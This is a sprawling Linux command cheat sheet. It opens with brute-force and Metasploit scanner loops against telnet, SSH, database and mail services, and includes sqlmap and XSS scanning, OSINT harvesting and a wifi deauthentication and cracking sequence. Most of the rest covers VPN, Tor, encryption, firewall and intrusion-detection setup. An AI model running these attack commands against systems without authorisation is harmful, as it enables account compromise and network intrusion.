hydra -L $USER_FILE -P $PASS_FILE $TARGET telnet -f 
for a in `cat $FINDSPLOIT_DIR/msf_search/auxiliary | egrep "telnet" | egrep "scanner" | awk '{print $1}'`; do echo -e "$COLOR2Running Metasploit module: $a..." && msfcli $a LHOST=$LHOST RPORT=23 RHOST=$TARGET RHOSTS=$TARGET USER_FILE=$USER_FILE PASS_FILE=$PASS_FILE THREADS=$THREADS E; done;
nmap -p 22 --script=telnet-* $TARGET
cisco-torch -A $TARGET



for a in `cat $FINDSPLOIT_DIR/msf_search/auxiliary | egrep "mysql" | egrep "scanner" | awk '{print $1}'`; do echo -e "$COLOR2Running Metasploit module: $a..." && msfcli $a LHOST=192.168.1.145 RHOST=$TARGET RHOSTS=$TARGET RPORT=3306 USER_FILE=$USER_FILE PASS_FILE=$PASS_FILE THREADS=$THREADS E; done;
nmap --script=mysql* -p 3306 $TARGET
hydra -L $USER_FILE -P $PASS_FILE $TARGET mysql


for a in `cat $FINDSPLOIT_DIR/msf_search/auxiliary | egrep "postgres" | egrep "scanner" | awk '{print $1}'`; do echo -e "$COLOR2Running Metasploit module: $a..." && msfcli $a LHOST=192.168.1.145 RHOST=$TARGET RHOSTS=$TARGET RPORT=5432 USER_FILE=$USER_FILE PASS_FILE=$PASS_FILE THREADS=$THREADS E; done;
nnmap --script=pgsql* -p 5432 $TARGET



wpscan --url http://$TARGET:8000 --batch
wafw00f http://$TARGET:8000
whatweb http://$TARGET:8000
nikto -C all -h http://$TARGET:8000 
sqlmap -u http://$TARGET:8000 --crawl 3 --dbs --answer="redirect=Y" --batch
echo -e "Starting XSSer..." && xsser -u http://$TARGET:8000 -c10 --Cw=200 --auto --save --follow-redirects | egrep "Injection:|Final Results:|Injections:|Failed:|Successfull:|Accur:"
xsstracer $TARGET 8000
hydra -L $USER_FILE -P $PASS_FILE $TARGET http-head -s 8000 -m /




hydra -L $USER_FILE -P $PASS_FILE $TARGET pop3 -f 
for a in `cat $FINDSPLOIT_DIR/msf_search/auxiliary | egrep "pop" | egrep "scanner" | awk '{print $1}'`; do echo -e "$COLOR2Running Metasploit module: $a..." && msfcli $a LHOST=192.168.1.145 RHOST=$TARGET RHOSTS=$TARGET RPORT=110 USER_FILE=$USER_FILE PASS_FILE=$PASS_FILE THREADS=$THREADS E; done;
nmap -p 110 --script=pop3-* $TARGET














hydra -L $USER_FILE -P $PASS_FILE $TARGET ssh -f 
for a in `cat $FINDSPLOIT_DIR/msf_search/auxiliary | egrep "ssh" | egrep "scanner" | awk '{print $1}'`; do echo -e "$COLOR2Running Metasploit module: $a..." && msfcli $a LHOST=192.168.1.145 RHOST=$TARGET RHOSTS=$TARGET RPORT=22 USER_FILE=$USER_FILE PASS_FILE=$PASS_FILE THREADS=$THREADS KEY_PATH=$KEY_PATH VERBOSE=false E; done;
nmap -p 22 --script=ssh-* $TARGET


theharvester -d $TARGET -b google
theharvester -d $TARGET -b bing
theharvester -d $TARGET -b linkedin
theharvester -d $TARGET -b people123








Sublist3r
Brutesubs
Censys.py
massdns - DNS stub resolver
ListSubs.txt (A list with a lot of subs).





EyeWitness (EyeWitness is designed to take screenshots of websites, provide some server header info, and identify default credentials if possible).






GoBuster (Directory/file & DNS busting tool written in Go).












openssl req -newkey rsa:4096 -keyout /etc/openvpn/$ClientVPNKey.pem -out /etc/openvpn/$ClientVPNKey.csr

openssl x509 -CA $cacert.pem -CAkey $cakey.pem -CAcreateserial -days 730 -req -in /etc/openvpn/$ClientVPNKey.csr -out /etc/openvpn/$ClientVPNKey.pem


openssl req -newkey rsa:4096 -keyout /etc/openvpn/$ClientVPNKey.pem -out /etc/openvpn/$ClientVPNKey.csr
##  Generating a RSA private key
##  ....++++
##  ...........................................................++++
##  writing new private key to '/etc/openvpn/ClientVPNKey.pem'


##-==============================================-##
##     [+] Convert Certificates To Encrypted .p12 Format:
##-==============================================-##
## ------------------------------------------------------------------------------- ##
##   [?] Some software will only read VPN certificates 
##         that are stored in a password-encrypted .p12 file.
## ------------------------------------------------------------------------------- ##
openssl pkcs12 -export -inkey $Key.key -in $Cert.crt -certfile $CA.crt -out $Cert.p12





openvpn --genkey --secret openvpn.key

scp openvpn.key 192.168.10.129:/root/





##-===========================================================-##
##     [+] Create an archive file and encrypt its contents with **openssl**. 
This can be done with the following command:
tar cz folder_to_encrypt | openssl enc -aes-256-cbc -e > out.tar.gz.enc

##-======================================-##
##     [+] Decryption can be done as follows:
cat out.tar.gz.enc  | openssl enc -aes-256-cbc -d




Encrypted archive with openssl and tar
tar --create --file - --posix --gzip -- <dir> | openssl enc -e -aes256 -out <file>
Create an AES256 encrypted and compressed tar archive. 
User is prompted to enter the password. 

Decrypt with: 
openssl enc -d -aes256 -in <file> | tar --extract --file - --gzip

tar c folder_to_encrypt | openssl enc -aes-256-cbc -e > secret.tar.enc



Encrypt directory with GnuPG and tar
tar zcf - foo | gpg -c --cipher-algo aes256 -o foo.tgz.gpg

Decrypt with: 
gpg -o- foo.tgz.gpg | tar zxvf -




gpg --verbose --symmetric --cipher-algo aes256 --digest-algo sha512 --cert-digest-algo sha512 --s2k-mode 3 --s2k-count 65011712 --s2k-cipher-algo AES256 --s2k-digest-algo SHA512 

 

##-=======================================-##
##     [+] Enabling A Kill Switch Using IPTables:
##-=======================================-##
sudo iptables -P OUTPUT DROP
sudo iptables -A OUTPUT -o tun+ -j ACCEPT
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A OUTPUT -o lo -j ACCEPT
sudo iptables -A OUTPUT -d 255.255.255.255 -j ACCEPT
sudo iptables -A INPUT -s 255.255.255.255 -j ACCEPT
sudo iptables -A OUTPUT -o eth+ -p udp -m multiport --dports 53,1300:1302,1194:1197 -d 141.98.255.0/24,193.138.218.0/24,45.83.220.0/24,185.213.152.0/24,185.213.154.0/24,185.65.135.0/24,185.65.134.0/24 -j ACCEPT
sudo iptables -A OUTPUT -o eth+ -p tcp -m multiport --dports 53,443 -d 141.98.255.0/24,193.138.218.0/24,45.83.220.0/24,185.213.152.0/24,185.213.154.0/24,185.65.135.0/24,185.65.134.0/24 -j ACCEPT
sudo iptables -A OUTPUT -o eth+ ! -d 193.138.218.74 -p tcp --dport 53 -j DROP
sudo ip6tables -P OUTPUT DROP
sudo ip6tables -A OUTPUT -o tun+ -j ACCEPT



sudo systemctl enable openvpn*.service && sudo systemctl start openvpn*.service









##-=======================-##
##    [+] Show account info
##-=======================-##
mullvad account get


##-=====================================-##
##     [+] Set + Save Mullvad Account Number 
##-=====================================-##
mullvad account set 1234123412341234


##-========================-##
##     [+] List server locations:
##-========================-##
## ------------------------------------------------------------------------------ ##
##     [?] Display a list of available countries and cities.
## ------------------------------------------------------------------------------ ##
mullvad relay list


##-=====================-##
##     [+] Select a location
##-=====================-##
mullvad relay set location se mma


##-==========================-##
##     [+] Select a specific server
##-==========================-##
mullvad relay set location se mma se-mma-001


##-=========================================-##
##    [+] Connect to the location that you selected
##-=========================================-##
mullvad connect


##-=================-##
##     [+] Disconnect
##-=================-##
mullvad disconnect


##-=================================-##
##     [+] Force an update to the serverlist
##-=================================-##
mullvad relay update


##-================================-##
##     [+] Check Your Connection Status
##-================================-##
mullvad status


##-==================================-##
##     [+] Auto-Connect Mullvad on Start-up
##-==================================-##
mullvad auto-connect set on


##-=========================-##
##     [+] Turn Auto-Connect off
##-=========================-##
mullvad auto-connect set off


##-=======================================-##
##    [+] Check if you are connected to Mullvad
##-=======================================-##
curl https://am.i.mullvad.net/connected


##-============================-##
##     [+] IPduh.com / Privacy Test
##-============================-##
https://ipduh.com/privacy-test/


##-===================================-##
##     [+] DNS Leak + Fingerprinting Tests:
##-===================================-##
http://check2ip.com/
http://dnsleak.com/
https://dnsleaktest.com/

/home/parrotsec-kiosk/Downloads/Scripts/ParrotLinux-Public-Kiosk-Project-Updated/[05-11-20]/Xe1phix-[Firefox-Hardening]/

worldveil/dejavu
dpwe/audfprint



##-===========================================-##
##     [+] Darknet (TorBrowser) Fingerprinting Tests:
##-===========================================-##
curl https://check.torproject.org
curl -s https://check.torproject.org/ | cat | grep -m 1 Congratulations || echo "Congratulations. This browser is configured to use Tor!"

curl -s --socks5 127.0.0.1:9150 
curl --socks5 localhost:9050 --socks5-hostname localhost:9050 -s $Domain
curl --socks5 localhost:9150 --socks5-hostname localhost:9150 -s $Domain

curl -v -x socks5://127.0.0.1:9150 -s $Domain
curl --socks5 localhost:9050 --socks5-hostname localhost:9050 -s https://check.torproject.org
curl --socks5 localhost:9150 --socks5-hostname localhost:9150 -s https://check.torproject.org

 | cat | grep -m 1 Congratulations | xargs
* Congratulations. This browser is configured to use Tor. 

export http_proxy="http://localhost:8118"
--user-agent "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US;
 rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6"


--socks5


turl(){ curl --socks5-hostname localhost:9050 $@ ; }

https://www.commandlinefu.com/commands/view/12497/use-curl-with-a-local-socks5-proxy-e.g.-tor



Use SOCKS proxy to upload over SSH:

curl --upload-file $1 --socks5-hostname CONDUITHOST:1080 http://config/package/



Forward port 8888 to remote machine for SOCKS Proxy
ssh -D 8888 user@site.com
Simply change your web browser's proxy settings to point to a SOCKS proxy at port 8888 and you're good to go.




















torify openssl s_client -connect $ONION:$PORT
torify openssl s_client -connect $ONION:$PORT -showcerts
torify openssl s_client -connect $ONION:$PORT -showcerts 2>/dev/null |  openssl x509 -in /dev/stdin -noout -fingerprint |  awk -F'=' '{print $2}' |  tr -d ':'


curl --socks5-hostname 127.0.0.1:9050 -o $File $URL
curl --socks5-hostname 127.0.0.1:9150 -o $File $URL
curl --proxy "socks5h://localhost:9050" --tlsv1.2 $URL
curl --proxy "socks5h://localhost:9150" --tlsv1.2 $URL
curl --proxy "socks5h://localhost:9050" --tlsv1.2 --compressed --user-agent "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0" -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'DNT: 1' $URL





curl -v -x socks5://$User:$Pass@$IP:$Port $URL




##-============================-##
##     [+] construct telegram links:
##-============================-##
https://t.me/socks?server=yourserverip&port=443&user=proxyuser&pass=password
tg://socks?server=yourserverip&port=443&user=proxyuser&pass=password


##-======================================================-##
##     [+] Connect To Telegram Using SOCKS5 Proxy Connections
##-======================================================-##

##-=======================================-##
##     [+] Connect To Telegram Using Wireguard 
##-=======================================-##
https://t.me/socks?server=10.64.0.1&port=1080

##-=======================================-##
##     [+] Connect To Telegram Using OpenVPN
##-=======================================-##
https://t.me/socks?server=10.8.0.1&port=1080


## List of Active, loaded, and Running Services:
systemctl -a | grep -E '.*\.service.*loaded.*active.*running' | grep -v '@' | awk '{print $1}'



journalctl -f | grep vpn
tail -f /var/log/syslog | grep vpn
egrep -w 'warning|error|critical' /var/log/messages


journalctl --unit openvpn-client
journalctl -u openvpn-client@
journalctl -f | grep vpn
tail -f /var/log/syslog | grep vpn
 
journalctl -k --grep="IN=.*OUT=.*"

journalctl -p warning									## displays all messages with a priority level of “warning”
journalctl --since "1 hour ago"					## Query the systemd journal for events happened in the last hour
journalctl -u sshd.service							## Query the systemd journal for a specific unit

journalctl /usr/bin/dbus-daemon				## Show all logs generated by the D-Bus executable:

journalctl -k -b -1						## Show all kernel logs from previous boot:
echo "## ============================================================================== ##"
journalctl -f -u apache					## Show a live log display from a system service apache.service:

##-==============================================================-##
##  [+] Retrieve dropped connections from firewalld journaling
##-==============================================================-##
journalctl -b | grep -o "PROTO=.*" | sed -r 's/(PROTO|SPT|DPT|LEN)=//g' | awk '{print $1, $3}' | sort | uniq -c


journalctl _PID=
journalctl _UID=1000
_UID=0
journalctl _GID=
journalctl _SYSTEMD_OWNER_UID=

journalctl _SYSTEMD_UNIT=avahi-daemon.service						## With one match specified, all entries with a field matching the expression are shown:
journalctl _CMDLINE=

nm-applet
Journalctl-Unit-
journalctl --all --unit apparmor.service
journalctl --all --unit conntrackd.service
journalctl --all --unit fail2ban.service
journalctl --all --unit fwlogwatch.service
journalctl --all --unit logrotate.service
journalctl --all --unit rsyslog.service
journalctl --all --unit syslog-ng.service
journalctl --all --unit ipset.service
journalctl --all --unit iptables.service
journalctl --all --unit ip6tables.service
journalctl --all --unit nftables.service
journalctl --all --unit mullvad-daemon.service
journalctl --all --unit openvpn.service
journalctl --all --unit netfilter-persistent.service
journalctl --all --unit networking.service
journalctl --all --unit NetworkManager-dispatcher.service
journalctl --all --unit NetworkManager.service
journalctl --all --unit resolvconf-pull-resolved.service
journalctl --all --unit systemd-networkd.service
journalctl --all --unit psad.service
journalctl --all --unit sagan.service
journalctl --all --unit snort.service






kill -HUP `pidof rsyslogd`
kill -HUP `cat /var/run/rsyslogd.pid`
service rsyslog start
/etc/init.d/rsyslog reload
systemctl list-unit-files | grep rsyslog



logger -t "food[$$]" -p local3.warning "$count connections from $host"


syslog-ng-ctl verbose --set=on
syslog-ng-ctl stats



fwcheck_psad --fw-analyze											## Analyze the local iptables ruleset and exit.
fwcheck_psad --config /etc/psad/psad.conf				## psad configuration file

##-========================================================-##
##    [+] Analyze a specific rulset from a file rather than the local policy:
##-========================================================-##
fwcheck_psad --fw-file /etc/iptables/FWSnort.rules				## analyze a specific rulset from a file rather than the local policy.


--config /etc/fwsnort/fwsnort.conf
--update-rules
--rules-url
--ipt-apply
--ipt-sync
--ipt-list
--verbose
--logfile /var/log/fwsnort.log


--ipt-check-capabilities						## Check iptables capabilities

##-=======================================-##
##    [+] Generate  iptables  rules  for  Snort rules
##-=======================================-##
fwsnort --ipt-sync --verbose


##-===================================================-##
##    [+] Generate ip6tables rules for attacks delivered over IPv6:
##-===================================================-##
fwsnort -6








snort -i eth0
snort -K pcap							## packet logging mode
snort -l /var/log/snort				## Set the output logging directory

snort -r $File.pcap				## Read the tcpdump-formatted file
snort --pcap-dir="/$Dir/"

snort --pcap-filter="*.pcap" --pcap-dir=/$Dir/

snort --pcap-dir=/$Dir/ --pcap-show
snort 
snort 
snort 



/etc/init.d/psad start


/var/log/psad/fwdata
psad --Analyze-msgs $IPTablesLogFile
psad --fw-analyze
psad -A -m $IPTablesLogFile
psad -A -m $IPTablesLogFile --analysis-fields src:$IP



psad --sig-update
psad --signatures /etc/psad/signatures
/etc/psad/snort_rules/*.rules


psad --Status
psad --status-summary
psad --fw-dump











conntrackd -s 
conntrackd -s network
conntrackd -s cache
conntrackd -s runtime
conntrackd -s link
conntrackd -s rsqueue
conntrackd -s process
conntrackd -s queue
conntrackd -s ct
conntrackd -s expect

              Dump statistics. If no parameter is passed, it displays the general statistics.
              If "network" is passed as parameter it displays the networking statistics.
              If "cache" is passed as parameter, it shows the extended cache statistics.
              If "runtime" is passed as parameter, it shows the run-time statistics.
              If "process" is passed as parameter, it shows existing child processes (if any).
              If "queue" is passed as parameter, it shows queue statistics.
              If "ct" is passed, it displays the general statistics.
              If "expect" is passed as parameter, it shows expectation statistics.


xtables-monitor
/var/cache/iptables-optimizer

--condition 
gradm --enabled
iface eth0 --multicast
--broadcast

/proc/net/nf_condition/name.


--ctstate 
INVALID
ESTABLISHED

--ctstatus 



ip6tables -p ipv6-icmp -h
--protocol ipv6-icmp
--protocol icmpv6




-m owner --uid-owner 
--gid-owner


# The string pattern can be used for simple text characters.
              iptables -A INPUT -p tcp --dport 80 -m string --algo bm --string 'GET /index.html' -j LOG




create an accounting object:

nfacct add http-traffic


attach it to the accounting object via iptables:

iptables -I INPUT -p tcp --sport 80 -m nfacct --nfacct-name http-traffic
iptables -I OUTPUT -p tcp --dport 80 -m nfacct --nfacct-name http-traffic


check for the amount of traffic that the rules match:

nfacct get http-traffic

##   { pkts = 00000000000000000156, bytes = 00000000000000151786 } = http-traffic;




# start nft in interactive mode
           nft --interactive

           # create a new table.
           create table inet mytable





nft describe ct_state

nft describe tcp flags


xtables-monitor --trace


Listen to all events, report in native nft format.

nft monitor

Listen to ruleset events such as table, chain, rule, set, counters and quotas, in native nft format
nft monitor ruleset



# inspect state of the sets.
           nft list set ip filter flood
           nft list set ip filter blackhole

           # manually add two addresses to the blackhole.
           nft add element filter blackhole { 10.2.3.4, 10.23.1.42 }


# drop packets coming from blacklisted ip addresses.
           nft add rule ip filter input ip saddr @blackhole counter drop

           # add source ip addresses to the blacklist if more than 10 tcp connection
           # requests occurred per second and ip address.
           nft add rule ip filter input tcp flags syn tcp dport ssh \
               add @flood { ip saddr limit rate over 10/second } \
               add @blackhole { ip saddr } drop


# log the UID which generated the packet and ip options
           ip filter output log flags skuid flags ip options

           # log the tcp sequence numbers and tcp options from the TCP packet
           ip filter output log flags tcp sequence,options

           # enable all supported log flags
           ip6 filter output log flags all

# match ICMPv6 ping packets
           filter output icmpv6 type { echo-request, echo-reply }


# drop packets to address not configured on incoming interface
           filter prerouting fib daddr . iif type != { local, broadcast, multicast } drop

           # perform lookup in a specific 'blackhole' table (0xdead, needs ip appropriate ip rule)
           filter prerouting meta mark set 0xdead fib daddr . mark type vmap { blackhole : drop, prohibit : jump prohibited, unreachable : drop }





nfct add helper ftp inet tcp











daemonlogger -i eth0 -l /var/log/daemonlogger/$File



daemonlogger -r              Activate ringbuffer mode

daemonlogger -s <bytes>      Rollover the log file every <bytes>
daemonlogger -S <snaplen>    Capture <snaplen> bytes per packet
daemonlogger -t <time>       Rollover the log file on time intervals

daemonlogger -R $File.pcap  Read packets from <pcap file>
daemonlogger -u <user name>  Set user ID to <user name>







netstat ‐anp ‐‐udp ‐‐tcp | grep LISTEN



ethtool -S eth0




sudo wpa_cli status
sudo wpa_cli interface_list
sudo netstat -s | egrep -i 'loss|retran'




iwlist 
iwlist wlan0
sudo iwlist wlan0 scan
sudo iwlist wlan0 scan | grep ESSID
sudo ip link set wlan0 down
sudo ip link set wlan0 up
sudo iw reg get
sudo iw reg set CH
sudo nmcli radio wifi on
nmcli dev show wlan0
nmcli device wifi
nmcli device wifi rescan
sudo iwlist wlan0 scan


## ----------------------------------------- ##
##    [+] Monitoring requests
## ----------------------------------------- ##
sudo tcpflow -p -c -i eth0 port 80 | grep -oE '(GET|POST|HEAD) .* HTTP/1.[01]|Host: .*'


## ------------------------------------------------------------------------------- ##
##    [+] Monitoring requests
## ------------------------------------------------------------------------------- ##
tcpflow -p -c -i eth0 port 80
tcpflow -C -i any -e all port 80

##-=================================================-##
##    [+] Process all of the pcap files in the current directory
##-=================================================-##
tcpflow -o out -a -l *.pcap

##-===================================================-##
##    [+] Monitor all TCP ports, use a more general expression:
##-===================================================-##
urlsnarf -i eth1 tcp


## -------------------------------------------- ##
##    [?] PCAP Statistical Data:
## -------------------------------------------- ##
capinfos $File.pcap
tcpslice -r $File.pcap
tcpstat $File.pcap



## ------------------------------------------------------------------------------- ##
##    [+] Generate a target list from supplied IP netmask
## ------------------------------------------------------------------------------- ##
Fping -a -g 192.168.7.0/24



### Network Forensics - File Extraction

tcpdump -nni eth0 -w $File.pcap port 80 &
jobs
kill %1
tcpflow -r $File.pcap
tcpxtract -f $File.pcap -o xtract/
tcpstat -i eth0 -o "Time: %S\tpps: %p\tpacket count: %n\tnet load: %l\tBps: %B\n"



curvetun
ip tuntap add dev $TUN_DEV mode tun user $TUN_USER

SSH_CMDLN="ssh -i $SSH_KEY -fNC -D localhost:$SOCKS_PORT root@$SERVER_IP -p $SERVER_PORT -o ServerAliveInterval=5 -o ServerAliveCountMax=3 -o ExitOnForwardFailure=yes -o StrictHostKeyChecking=no"
#SSH_CMDLN="ssh -fNC -D localhost:$SOCKS_PORT root@$SERVER_IP -p $SERVER_PORT -o ServerAliveInterval=5 -o ServerAliveCountMax=3 -o ExitOnForwardFailure=yes"



## nolocal.net is a client filter that disable access to local network.
firejail --netfilter=/etc/firejail/nolocal.net --net=eth0 firefox

firejail --trace wget -q www.debian.org
firejail --tracelog firefox

firejail --overlay-tmpfs 






vm.unprivileged_userfaultfd = 1
user.max_cgroup_namespaces = 31318
user.max_inotify_instances = 128
user.max_inotify_watches = 8192
user.max_ipc_namespaces = 31318
user.max_mnt_namespaces = 31318
user.max_net_namespaces = 31318
user.max_pid_namespaces = 31318
user.max_time_namespaces = 31318
user.max_user_namespaces = 31318
user.max_uts_namespaces = 31318



# enable user namespaces (https://superuser.com/questions/1094597/enable-user-namespaces-in-debian-kernel)
echo 'kernel.unprivileged_userns_clone=1' > /etc/sysctl.d/00-local-userns.conf
sudo sysctl kernel.unprivileged_userns_clone=1

net.netfilter.nf_log_all_netns = 1




cat >> /etc/sysctl.d/99-sysctl.conf << END

net.ipv6.conf.all.disable_ipv6 = 1
net.ipv6.conf.default.disable_ipv6 = 1
net.ipv6.conf.lo.disable_ipv6 = 1
net.ipv6.conf.eth0.disable_ipv6 = 1
END


sysctl -p
cp $CONFIG/sysctl.conf /etc/sysctl.conf
/sbin/sysctl -p /etc/sysctl.conf

/lib/systemd/systemd-sysctl 50-coredump.conf


/sbin/sysctl --system --pattern '^net.ipv6'

modules-load.d



cp -f $CONFIG/auditd.conf /etc/audit/auditd.conf


cgroupfs-mount

/sys/kernel/cgroup/features
/sys/kernel/cgroup/delegate
 /proc/[pid]/cgroup
/proc/cgroups


curl $Domain --socks5-host 10.64.0.1
curl $Domain --socks5-host nl1-wg.socks5.mullvad.net

brave-browser --proxy-server=socks5://10.64.0.1
chromium-browser --proxy-server=socks5://10.64.0.1


* View 500 results of $Domain via Google
Theharvester -d $Domain -l 500 -b google

* View default results of $Domain via Linkedin
theharvester -d $Domain -b linkedin

##-====================================================-##
##  [+] Extract public pdf, doc, and ppt files from target.com 
## -------------------------------------------------------------------- ##
##  [?] (limited to 200 searches and 5 downloads)
## -------------------------------------------------------------------- ##
##  [+] save the downloads to "/root/Desktop/metagoofil/"
##  [+] output results to "/root/Desktop/metagoofil/result.html"
##-====================================================-##
metagoofil -d $Domain -t pdf,doc,ppt -l 200 -n 5 -o /$Dir/ -f /$Dir/$File.html


##-====================================================-##
##    [+] Scan for documents from a domain
##          (-d kali.org) that are PDF files (-t pdf)
##    [+] searching 100 results (-l 100)
##    [+] download 25 files (-n 25)
##    [+] saving the downloads to a directory (-o kalipdf)
##    [+] saving the output to a file (-f kalipdf.html)
##-======================================================-##
metagoofil -d $Domain.org -t pdf -l 100 -n 25 -o /$Dir/ -f $File.html



theharvester -d $Domain -l 300 -b google -f $Domain.html




theharvester -d $Domain -l 500 -b google -h $File.html
theharvester -d $Domain -b pgp
theharvester -d $Domain -l 200 -b linkedin
theharvester -d $Domain -b googleCSE -l 500 -s 300


theharvester -d $Domain -l 500 -b google -h $Domain.html
theharvester -d $Domain -b pgp
theharvester -d $Domain -l 200 -b linkedin
theharvester -d $Domain -b googleCSE -l 500 -s 300

$Domain

metagoofil -d $Domain -t pdf -l 200 -o /$Dir/ -f $File.html

metagoofil.py -d $Domain -t doc,pdf -l 200 -n 50 -o /$Dir/ -f $File.html
metagoofil.py -h yes -o /$Dir/ -f $File.html




* Target a domain
dnsrecon -d $Domain


* Search for Zone Transfers on domain
Dnsrecon -d $Domain -t axfr


* Google enumeration (servers)
dnsrecon -d $Domain -g




it clone https://github.com/sundowndev/PhoneInfoga

Search a Phone Number with Phoneinfoga
phoneinfoga.py -n 1717███9539 --recon



https://github.com/sundowndev/PhoneInfoga/wiki/


https://null-byte.wonderhowto.com/how-to/uncover-hidden-subdomains-reveal-internal-services-with-ct-exposer-0187286/




https://null-byte.wonderhowto.com/how-to/use-spiderfoot-for-osint-gathering-0180063/



https://null-byte.wonderhowto.com/how-to/use-buscador-osint-vm-for-conducting-online-investigations-0186611/



https://null-byte.wonderhowto.com/how-to/use-maltego-fingerprint-entire-network-using-only-domain-name-0184900/


https://www.amazon.com/Open-Source-Intelligence-Techniques-Information/dp/1984201573/?tag=whtnb-20
https://null-byte.wonderhowto.com/how-to/use-spiderfoot-for-osint-gathering-0180063/
https://null-byte.wonderhowto.com/how-to/quickly-look-up-valid-subdomains-for-any-website-0184426/
https://null-byte.wonderhowto.com/collection/maltego/

https://null-byte.wonderhowto.com/how-to/video-use-maltego-research-mine-data-like-analyst-0180985/

https://null-byte.wonderhowto.com/how-to/recon/


https://null-byte.wonderhowto.com/how-to/hack-like-pro-conduct-passive-os-fingerprinting-with-p0f-0151191/


https://null-byte.wonderhowto.com/how-to/hack-like-pro-find-vulnerabilities-for-any-website-using-nikto-0151729/

https://null-byte.wonderhowto.com/collection/maltego/

Best of Anti-Flag (Official Videos)
https://www.youtube.com/watch?v=0DP3sqbwh-s&list=PLCMvuMNehBkcKW7p6YdqmK8VY94W7abUS















Search a Phone Number on IntelTechniques



https://null-byte.wonderhowto.com/how-to/video-use-maltego-research-mine-data-like-analyst-0180985/





















##   [+]  Update IP filter for qBittorrent 

wget -O - http://list.iblocklist.com/\?list\=ydxerpxkpcfqjaybcssw\&fileformat\=p2p\&archiveformat\=gz | gunzip > ~/ipfilter.p2p

https://www.commandlinefu.com/commands/view/14879/update-ip-filter-for-qbittorrent




##-==============================================-##
##   [+] Xe1phix-qBittorrent-IPfilter-Fetch.sh
##-==============================================-##
## ---------------------------------------------- ##
##   [?] Update IP filter for qBittorrent 
## ---------------------------------------------- ##
wget -O - http://list.iblocklist.com/\?list\=ydxerpxkpcfqjaybcssw\&fileformat\=p2p\&archiveformat\=gz | gunzip > ~/ipfilter.p2p



##-====================================================================-##
##  [+] Show the entire log in a pager that can be scrolled through:
##-====================================================================-##
journalctl -u qbittorrent.service


##-====================================================================-##
##  [+] Show the live version of the log file as things are happening:
##-====================================================================-##
journalctl -f -u qbittorrent.service


https://mullvad.net/en/account/#/openvpn-config/

curl -LO https://mullvad.net/media/files/mullvad-wg.sh && chmod +x ./mullvad-wg.sh && ./mullvad-wg.sh
chown root:root -R /etc/wireguard && chmod 600 -R /etc/wireguard

##-================================================-##
##    [+] Run The Mullvad - WireGuard Configuration Script:
##-================================================-##
curl -LO https://mullvad.net/media/files/mullvad-wg.sh
chmod +x ./mullvad-wg.sh
./mullvad-wg.sh

##-=================================================-##
##    [+] Set Strict Permissions For The Wireguard Directory:
##-=================================================-##
## ----------------------------------------------------- ##
##    [?] So Only Root Can Read Them
## ----------------------------------------------------- ##
chown root:root -R /etc/wireguard
chmod 600 -R /etc/wireguard

##-=======================================-##
##    [+] Start WireGuard automatically on boot:
##-=======================================-##
systemctl enable wg-quick@mullvad-se4

##-=======================-##
##    [+] Turn on WireGuard
##-=======================-##
wg-quick up mullvad-se4

##-=======================-##
##    [+] Turn off WireGuard
##-=======================-##
wg-quick down mullvad-se4









iptables -A OUTPUT -d $IP -m owner --uid-owner $UID -j ACCEPT


firejail --netns=protected firefox



 
airmin-ng check wlan0  - check to see if any proecess need to be killed defore going into monitor mode.
airmon-ng start wlan0
airodump-ng mon0
airodump-ng –c Ch# mon0 = isolate the channel
airodump-ng –w myffile –c 1 --bssid MAC Address mon0
aireplay-ng -0 2 –a MACADDR mon0 --ignoe-negative-zero = DeAuth  command
Aircrack-ng ourfile-01.cap –w Darknew.lst



## performing nikto webscan on port $port... 
nikto -host $target:$port -Format txt -output $logfile

curl -A "$NAME" -q --insecure -m 10 --dump-header $logfile https://$target:$port



performing whatweb fingerprinting on $target port $port...

whatweb -a3 --color never http://$target:$port --log-brief $logfile





Web Servers Recon:

gobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.php -u http://10.10.10.48:80 -o recon/gobuster_10.10.10.48_80.txt
nikto -host 10.10.10.48:80 | tee recon/nikto_10.10.10.48_80.txt

gobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.php -u http://10.10.10.48:32400 -o recon/gobuster_10.10.10.48_32400.txt
nikto -host 10.10.10.48:32400 | tee recon/nikto_10.10.10.48_32400.txt




curl -i ${IP}/robots.txt

gobuster -u http://$IP -w /usr/share/seclists/Discovery/Web_Content/Top1000-RobotsDisallowed.txt

gobuster -u http://$IP -w /usr/share/seclists/Discovery/Web_Content/common.txt




Reverse lookup of entire provided range:

dig.sh <ips.txt>

for ip in $(cat ips.txt); do nslookup $ip <nameserver>; done



ufw logging on
sed -i.bak '/processed/i\# custom psad logging directives\n-A INPUT -j LOG --log-tcp-options --log-prefix "[IPTABLES] "\n-A FORWARD -j LOG --log-tcp-options --log-prefix "[IPTABLES] "\n' /etc/ufw/before.rules /etc/ufw/before6.rules /etc/ufw/after.rules /etc/ufw/after6.rules

# Default policies
 ufw default deny incoming
 ufw default deny outgoing
 
 # Openvpn interface (adjust interface accordingly to your configuration)
 ufw allow in on tun0
 ufw allow out on tun0
 
 # Local Network (adjust ip accordingly to your configuration)
 ufw allow in on eth0 from 192.168.1.0/24
 ufw allow out on eth0 to 192.168.1.0/24
 
 # Openvpn (adjust port accordingly to your configuration)
 ufw allow in on eth0 from any port 1194
 ufw allow out on eth0 to any port 1194



systemctl disable dbus-org.bluez.service bluetooth.service atftpd.service cyrus-imapd.service dovecot.service exim4-base.service geoclue.service ipp-usb.service iscsi.service iscsid.service ldap.service libbluetooth3.service libvirt-guests.service libvirtd.service lxc-net.service lxc.service lxcfs.service mdadm.service ModemManager.service mountnfs.service nfs-kernel-server.service nfs-server.service nfs.service nfslock.service onioncat.service openvpn-server.service pppd-dns.service privoxy.service ptunnel.service radvd.service rarpd.service rpc-statd-notify.service rpcgssd.service rpcidmapd.service rpcsvcgssd.service rsync.service rwhod.service samba-ad-dc.service selinux-autorelabel-mark.service selinux-autorelabel.service sendmail.service setroubleshoot.service shadowsocks-server@.service shadowsocks-local@.service shadowsocks.service smb.service smbd.service snmpd.service snmptrapd.service squid.service squidtaild.service strongswan-starter.service strongswan.service sysstat.service sysstat-summary.service sysstat-collect.service thin.service tomcat5.service vboxweb.service vgauth.service winbind.service wine.service ypbind.service printer.target rpcbind.target 